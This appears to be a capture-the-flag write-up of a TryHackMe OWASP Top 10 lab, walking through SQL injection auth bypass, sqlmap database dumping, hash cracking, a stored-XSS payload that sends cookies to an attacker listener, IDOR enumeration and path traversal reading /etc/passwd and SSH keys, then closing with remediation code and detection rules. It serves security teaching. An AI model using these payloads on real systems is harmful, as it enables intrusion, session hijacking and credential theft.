# CTF Writeup — TryHackMe: Web Application Exploitation (OWASP Top 10)
> Platform: TryHackMe | Difficulty: Medium | Category: Web Application Security
> Room: OWASP Top 10 / DVWA | Author: Matthew Vaishnav

---

## Objective

Exploit a series of web application vulnerabilities across a deliberately vulnerable
web app. Covers SQL injection, Cross-Site Scripting, Insecure Direct Object Reference,
and directory traversal — the most common vulnerability classes in real-world assessments.

**Skills Demonstrated:** Burp Suite, SQL injection, XSS, IDOR, path traversal,
authentication bypass, web enumeration

---

## Setup & Enumeration

### Nmap

```bash
nmap -sV -sC -p- --min-rate 5000 10.10.X.X -oN nmap.txt
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2
80/tcp open  http    Apache httpd 2.4.18
```

### Web Enumeration

```bash
# Directory brute force
gobuster dir -u http://10.10.X.X -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

# Output (relevant findings):
/login.php        (Status: 200)
/admin            (Status: 301) → redirects but returns content without auth
/uploads          (Status: 200)
/config.php       (Status: 403)
/robots.txt       (Status: 200)
```

`/robots.txt` revealed:
```
Disallow: /admin
Disallow: /backup
Disallow: /config
```

Checked `/backup`:
```
Index of /backup
  db_backup.sql  (downloadable — contained schema and user table)
```

---

## Vulnerability 1 — SQL Injection (Authentication Bypass)

### Identifying the Vulnerability

Login form at `/login.php`. Tested for SQLi by entering `'` in the username field:

```
Error: You have an error in your SQL syntax near ''' at line 1
```

Database error confirms unsanitized input.

### Manual Exploitation

```
Username: admin'-- -
Password: anything
```

This closes the string and comments out the password check:

```sql
-- Original query:
SELECT * FROM users WHERE username='$user' AND password='$pass'

-- Injected:
SELECT * FROM users WHERE username='admin'-- -' AND password='anything'
-- Everything after -- is a comment → password check bypassed
```

**Result: Logged in as admin.**

### SQLMap (Automated)

```bash
sqlmap -u "http://10.10.X.X/login.php" \
  --data="username=admin&password=test" \
  --level=3 --risk=2 \
  --dbs
```

```
[INFO] available databases:
[*] information_schema
[*] webapp_db
```

```bash
sqlmap -u "http://10.10.X.X/login.php" \
  --data="username=admin&password=test" \
  -D webapp_db --tables
```

```
[INFO] Tables:
+----------+
| users    |
| products |
+----------+
```

```bash
sqlmap -u "http://10.10.X.X/login.php" \
  --data="username=admin&password=test" \
  -D webapp_db -T users --dump
```

```
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
|  2 | karen    | d8578edf8458ce06fbc5bb76a58c5ca4 |
+----+----------+----------------------------------+
```

Cracked with hashcat:
```bash
hashcat -m 0 5f4dcc3b5aa765d61d8327deb882cf99 /usr/share/wordlists/rockyou.txt
# → password
```

---

## Vulnerability 2 — Stored Cross-Site Scripting (XSS)

### Identifying the Vulnerability

Comment field on a post page. Entered:

```html
<script>alert('XSS')</script>
```

Alert box appeared — input is not sanitized before being stored and rendered.

### Exploiting for Cookie Theft

Set up a listener:

```bash
nc -lvnp 8080
```

Injected a cookie-stealing payload:

```html
<script>
  fetch('http://10.X.X.X:8080/?c=' + document.cookie);
</script>
```

When any user loads the page, their cookie is sent to the attacker:

```
GET /?c=PHPSESSID=abc123def456... HTTP/1.1
Host: 10.X.X.X:8080
```

Used the stolen session cookie in Burp Suite to hijack the admin session:

1. Opened Burp → Intercept ON
2. Modified `Cookie:` header to the stolen value
3. Forwarded request → now authenticated as admin

---

## Vulnerability 3 — IDOR (Insecure Direct Object Reference)

### Identifying the Vulnerability

After logging in, the user profile URL was:

```
http://10.10.X.X/profile.php?id=12
```

Changed the `id` parameter to `1`:

```
http://10.10.X.X/profile.php?id=1
```

Received admin user's profile page — no authorisation check on the parameter.

### Systematic Enumeration

```bash
# Automated IDOR enumeration with ffuf
ffuf -u "http://10.10.X.X/profile.php?id=FUZZ" \
     -w <(seq 1 100) \
     -H "Cookie: PHPSESSID=<valid_session>" \
     -mc 200 -fs 1234
```

Found profiles for all users including admin. Retrieved:
- Email addresses
- Account creation dates
- Internal order IDs used for further chaining

---

## Vulnerability 4 — Directory Traversal / Path Traversal

### Identifying the Vulnerability

An image loading endpoint accepted a filename parameter:

```
http://10.10.X.X/display.php?file=welcome.png
```

Tested with `../`:

```
http://10.10.X.X/display.php?file=../../../etc/passwd
```

Response returned `/etc/passwd` contents:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
karen:x:1001:1001::/home/karen:/bin/bash
...
```

### Escalating — Reading Config Files

```bash
# PHP config → often contains DB credentials
http://10.10.X.X/display.php?file=../../../var/www/html/config.php

# SSH private key
http://10.10.X.X/display.php?file=../../../home/karen/.ssh/id_rsa

# Apache access logs (useful for log poisoning)
http://10.10.X.X/display.php?file=../../../var/log/apache2/access.log
```

`config.php` returned:

```php
$db_host = "localhost";
$db_user = "webapp";
$db_pass = "S3cur3P@ss!";
$db_name = "webapp_db";
```

Used these credentials to log in directly to MySQL via SQLMap `--sql-shell`.

---

## Flags

| Flag | Method |
|------|--------|
| Flag 1 | SQLi auth bypass → admin panel |
| Flag 2 | XSS → session hijack → admin files |
| Flag 3 | Path traversal → /flag.txt on server |
| Flag 4 | IDOR → user 1 profile contains flag |

---

## Lessons Learned & Blue Team Perspective

### Why These Worked

| Vulnerability | Root Cause |
|--------------|------------|
| SQL Injection | String concatenation into SQL query — no parameterised queries |
| Stored XSS | User input rendered as HTML without encoding or sanitisation |
| IDOR | Object references exposed in URL with no server-side authorisation check |
| Path Traversal | `file=` parameter passed directly to filesystem with no validation |

### Remediation

**SQL Injection:**
```php
// Vulnerable
$query = "SELECT * FROM users WHERE username='$user'";

// Fixed — prepared statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$user]);
```

**XSS:**
```php
// Vulnerable
echo "<p>" . $_POST['comment'] . "</p>";

// Fixed
echo "<p>" . htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8') . "</p>";
```

**IDOR:**
```php
// Always verify ownership server-side
if ($profile['user_id'] !== $_SESSION['user_id']) {
    http_response_code(403);
    exit("Access denied");
}
```

**Path Traversal:**
```php
// Validate against a whitelist of allowed files
$allowed = ['welcome.png', 'logo.png'];
if (!in_array($_GET['file'], $allowed)) { die(); }
```

### Detection Opportunities

- **WAF rules** for common SQLi patterns: `'--`, `UNION SELECT`, `OR 1=1`
- **Alert on repeated 4xx errors** from a single IP — indicates directory brute force
- **Log unusual file path patterns:** `../` in HTTP request parameters
- **CSP (Content Security Policy)** headers block inline script execution, mitigating XSS impact
- **Server-side request logging** to correlate parameter manipulation patterns

### MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|------------|
| Exploit Public-Facing Application | T1190 | SQL injection and path traversal |
| Command and Scripting Interpreter | T1059 | XSS JavaScript execution in browser |
| Data from Local System | T1005 | Reading /etc/passwd via traversal |
| Valid Accounts: Web Application | T1078.004 | Session hijacking via stolen cookie |

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Academy — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger Web Academy — XSS](https://portswigger.net/web-security/cross-site-scripting)
- [PortSwigger Web Academy — Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [MITRE ATT&CK T1190](https://attack.mitre.org/techniques/T1190/)
